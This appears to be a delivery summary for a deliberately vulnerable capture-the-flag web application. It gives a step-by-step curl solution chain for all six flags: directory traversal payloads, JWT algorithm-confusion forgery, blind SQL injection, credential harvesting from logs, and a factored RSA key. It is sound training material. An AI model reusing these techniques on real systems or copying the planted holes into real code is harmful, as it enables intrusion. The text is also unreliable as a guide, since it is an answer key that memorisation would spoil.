# CTF9 Dunholm Research TrialVault -- Delivery Summary

Delivered 2026-04-19.

---

## What was built

Advanced-tier Spring Boot 3.2 CTF challenge with six chained flags covering
OWASP 2021 A01, A02 (twice), A03, A05, A07, and A09. Players act as external
auditors called in after a competitor pre-print reproduced three paragraphs
of the NIMMOD-2 Phase 2 dossier verbatim. Every flag surfaces breadcrumbs
the next flag needs; no flag stands alone.

| Flag | Technique | OWASP |
|------|-----------|-------|
| 1 | Spring Boot Actuator + custom InfoContributor | A05 |
| 2 | Directory traversal via `....//` filter bypass | A01 |
| 3 | JWT algorithm confusion (RS256 to HS256, public key as HMAC secret) | A02, A07 |
| 4 | Blind boolean SQL injection on raw-concat search | A03 |
| 5 | RSA-512 factoring + AES-256-GCM hybrid decryption | A02 |
| 6 | DEBUG request-body logging + staff form login | A09 |

Stack: Java 17, Spring Boot 3.2.5 (Web, Security, Data JPA, Actuator,
Thymeleaf, Data Redis), jjwt 0.12, Bucket4j 8.10, PostgreSQL 16, Redis 7.
Multi-stage Docker build on Eclipse Temurin 17 JRE jammy. External port
3003.

---

## Deviations from the original brief

| Deviation | Reason |
|-----------|--------|
| Base image switched from `eclipse-temurin:17-jre-alpine` to `eclipse-temurin:17-jre-jammy` | `17-jre-alpine` has no published arm64 manifest; build failed on the user's Apple Silicon dev machine |
| Flag 4 extraction technique uses `ascii(substr(...))=<code>` rather than `substr(...)='<ch>'` | Hibernate's native-query preprocessor interprets `{` as the start of a JDBC escape sequence (`{fn ...}`, `{d '...'}`). Payloads that carry `{` literally fail silently. The ascii-compare workaround sidesteps the character class entirely and is documented in SOLUTIONS.md as the canonical technique |
| JWT filter reads `role` (singular) claim, not `roles` array | Matches the `JwtAuthFilter.parseAuthorities` implementation. Forged tokens must carry `"role":"cto_admin"` (string), not `"roles":["ROLE_CTO_ADMIN"]` |
| Admin dashboard looks up Flag 3 by authenticated viewer (token `sub`), not by impersonated identity | Prevents a forged token from paying out another user's Flag 3. The forgery must still carry an admin `role`, but `sub` stays the player's own username |
| Flag 6 uses JSESSIONID for the staff console, not the JWT cookie | Implements Q3. JWT forgery does not bypass Flag 6. Player must authenticate as `amir.patel` through the staff form login with the plaintext password harvested from the Actuator logfile |

---

## Verification commands

Hand-typed curl recipe that reproduces the full chain against a fresh
stack. Replace `<USER>` with any player username and `<PASS>` with the
matching password from `data/users.json`.

```bash
# Phase A, reachability
curl -s http://localhost:3003/actuator/info
curl -s http://localhost:3003/actuator/env | jq '.propertySources[] | .properties | keys' | grep dunholm-handoff-a

# Flag 1 (authenticated Actuator info)
curl -s -c cookies.txt -b cookies.txt -X POST http://localhost:3003/login \
    --data-urlencode "username=<USER>" --data-urlencode "password=<PASS>"
curl -s -b cookies.txt http://localhost:3003/actuator/info | jq '.build.flag'

# Flag 2 (directory traversal)
curl -s "http://localhost:3003/api/files/download?name=....//....//app/config/application.properties" \
    -b cookies.txt | grep "flag2"
curl -s "http://localhost:3003/api/files/download?name=....//....//app/keys/public.pem" \
    -b cookies.txt -o public.pem

# Flag 3 (HS256 forgery, see SOLUTIONS.md for the Python script)
python3 forge_hs256.py public.pem <USER> > token.txt
curl -s -H "Cookie: trialvault_token=$(cat token.txt)" \
    http://localhost:3003/api/admin/dashboard | jq '.flag'

# Flag 4 (blind SQLi, see SOLUTIONS.md for the extraction script)
python3 blind_sqli.py <USER>

# Flag 5 (vault decryption)
curl -s "http://localhost:3003/api/files/download?name=....//....//data/vault/<USER>.enc" \
    -b cookies.txt -o <USER>.enc
python3 decrypt_vault.py <USER>.enc

# Flag 6 (logfile + staff login)
curl -s http://localhost:3003/actuator/logfile | grep amir.patel
curl -s -c staff-cookies.txt -b staff-cookies.txt -X POST http://localhost:3003/staff-login \
    --data-urlencode "username=amir.patel" --data-urlencode "password=DunholmCTO2024!"
curl -s -b staff-cookies.txt -b cookies.txt http://localhost:3003/incident-report | grep flag6
```

---

## RSA-512 document keypair

The same keypair is used for every player's encrypted vault file; only
the AES-GCM plaintext and IV vary.

```
n = 9296518881502069102155578325993172784268364525373962587705474209813341643724162570117836806574870065913561734967114351292121606661173511524220749034874581
e = 65537
p = 99556193349368171821945367454858420418985972903411997523294715050217474007271
q = 93379613751182753246354747615361746319280375453581111702821910823994672592611
bitlen(n) = 512
p * q == n
```

Factoring this modulus with `msieve -v` on a modern laptop takes around a
minute. The value has also been pre-submitted to factordb.com during
development. SOLUTIONS.md documents both paths and a pycryptodome fallback
for Windows.

AES-256-GCM key construction:

```
AES_KEY = SHA-256( DR_API_KEY_PART1 || encryption_key_part2 )
```

where `DR_API_KEY_PART1` is surfaced in `/actuator/env` via the
`app.config.dunholm-handoff-a` property (Flag 1 material) and
`encryption_key_part2` is extracted via blind SQLi from the shared
`secrets` row (Flag 4 material). Either half alone is insufficient.

---

## Narrative highlights

Scenes and lines worth reading end-to-end:

- **`board-minutes-2024-09.txt`**, item 2 (Competitor disclosure). Sets
  the audit premise. Rachel's request that the log review be run by
  security rather than by the CTO function is the crux of the audit.
- **`rachel-security-memo.txt`**, items 1 through 5. Maps directly onto
  Flags 4, 5, 6, 3, and 1 in that order. This is the player's reading
  guide without naming any endpoint the rest of the application does not
  already expose.
- **Admin dashboard `amir_note` field**. Amir's defence of the research
  endpoint as "fine for the handover" contradicts Rachel's memo. Players
  who have read both find the contradiction sharp.
- **Vault plaintext header** (`VaultEncryptionService.buildNarrativePlaintext`).
  The "classified release envelope" framing and the Phase 2 dossier body
  carry the Flag 5 receipt and a hint that the logs are worth looking at.
- **Seeded log line with Amir's plaintext password** (`LogfileSeedService`).
  Sits in 40 lines of realistic routine log; only one DEBUG entry leaks
  credential material. Teaches why DEBUG request-body logging is an A09
  finding rather than a privacy oversight.

---

## Documentation inventory

| File | Purpose |
|------|---------|
| `README.md` | Player-facing setup, credentials, flag format, references |
| `SOLUTIONS.md` | Instructor walkthrough with per-flag scripts, defence notes, unintended-solutions section |
| `STORY.md` | Narrative design, character bios, retheming guide |
| `workflow.md` | Implementation plan, design decisions Q1-Q5 and D1-D9, V1-V8 audit |
| `ctf-config.json` | Machine-readable metadata |
| `DELIVERY.md` | This summary |
| `/CHANGELOG.md` (repo root) | CTF9 entry appended under 19/04/26 |

---

## What remains (outside CTF9 scope)

- **`report/sections/methodology.tex`** update (D8). A single pass
  covering the methodology additions for all nine CTFs, deferred until
  after this delivery.
